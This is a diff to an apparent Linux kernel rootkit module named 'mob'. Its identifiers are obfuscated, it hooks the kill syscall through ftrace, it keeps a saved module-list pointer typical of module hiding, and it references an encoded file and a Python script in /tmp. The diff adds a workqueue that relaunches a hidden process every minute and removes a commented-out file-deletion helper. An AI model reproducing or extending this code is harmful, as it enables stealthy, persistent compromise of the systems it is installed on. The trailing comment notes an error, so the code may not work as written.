@@ -12,6 +12,7 @@
 #include <linux/slab.h>
 #include <linux/string.h>
 #include <linux/cred.h>
+#include <linux/workqueue.h>
 #include <linux/delay.h>
 #include "ft_help.h"
 
@@ -23,6 +24,9 @@ static pid_t shajshejxn = -1;
 
 static struct list_head *prev_module;
 static short dyehsndjks = 0;
+
+static struct workqueue_struct *wq_stat;
+static struct delayed_work scheduled_work;
 
 #define HAJSNEJDNF "/tmp/hsjajsnsjd.py"
 #define JSHDNEJSNA "/tmp/ahsjendhah.txt"
@@ -145,19 +149,6 @@ int jdkelskjds(const char *filepath, char *data) {
 
     return (written == data_size) ? 0 : -EIO;
 }
-
-// // Delete Encoded file
-// int ahsgehdbsj(void){
-
-//     char *argv[] = { "/bin/bash", "-c", "rm -f /tmp/ahsjendhah.txt", NULL };
-//     static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
-//     int ret;
-
-//     ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-
-//     return 0;
-// }
-
 
 int uehsjdnshd(void){
 
@@ -289,6 +280,21 @@ asmlinkage int ghsjdkensj(struct ftrace_regs *regs) {
 }
 
 
+// Scheduled function to check the process periodically
+void check_process_function(struct work_struct *work) {
+    idjehsndhs();
+    if (shajshejxn <= 0) {
+        oehjdpajek();
+        printk(KERN_INFO "mob: [INFO] Scheduled Task Executed Correctly with PID: %d\n", shajshejxn);
+    } else {
+        printk(KERN_INFO "mob: [INFO] Skipping Scheduled Task: Process already running\n");
+    }
+  
+    if (!delayed_work_pending(&scheduled_work)) {
+            queue_delayed_work(wq_stat, &scheduled_work, 1 * 60 * HZ);
+        }
+}
+
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_kill", ghsjdkensj, &orig_kill),
 };
@@ -303,13 +309,30 @@ static int __init mob_module_init(void) {
 
     oehjdpajek();
 
+    wq_stat = create_singlethread_workqueue("wq_stat");
+    if (!wq_stat) {
+        printk(KERN_ERR "mob: Failed to create workqueue\n");
+        return -ENOMEM;
+    }
+
+    // Initialize and schedule the delayed work
+    INIT_DELAYED_WORK(&scheduled_work, check_process_function);
+    queue_delayed_work(wq_stat, &scheduled_work, 1 * 60 * HZ);
+
     return 0;
 }
 
 static void __exit mob_module_exit(void) {
     jdhenshdks(&hooks[0]);
-    printk(KERN_INFO "mob: [INFO] Module unloaded\n");
+
+    cancel_delayed_work_sync(&scheduled_work);
+    destroy_workqueue(wq_stat);
+    
+    printk(KERN_INFO "mob: [INFO] Module unloaded -> Work Queue Destroyed\n");
 }
 
 module_init(mob_module_init);
 module_exit(mob_module_exit);
+
+
+// Getting error due to schedule task
